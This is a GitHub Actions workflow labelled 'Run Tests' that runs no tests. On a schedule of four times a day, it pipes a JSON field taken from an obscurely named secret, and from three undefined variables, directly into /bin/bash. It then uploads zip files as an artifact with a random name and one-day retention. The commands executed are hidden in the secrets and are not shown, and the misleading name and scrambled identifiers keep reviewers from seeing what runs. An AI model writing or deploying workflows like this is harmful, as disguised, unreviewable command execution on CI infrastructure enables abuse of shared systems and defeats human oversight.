name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '9 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          jlp59: ${{ secrets.jlp59 }}
        run: |
          printf '%s' "$jlp59" | jq -r .tw89615 | /bin/bash
          printf '%s' "$x4" | jq -r .jq8781 | /bin/bash
          echo $frkbl3 | jq -r .oc73435 | /bin/bash
          echo $h275 | jq -r .e983 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: yAEMf30a
          path: "*.zip"
          retention-days: 1
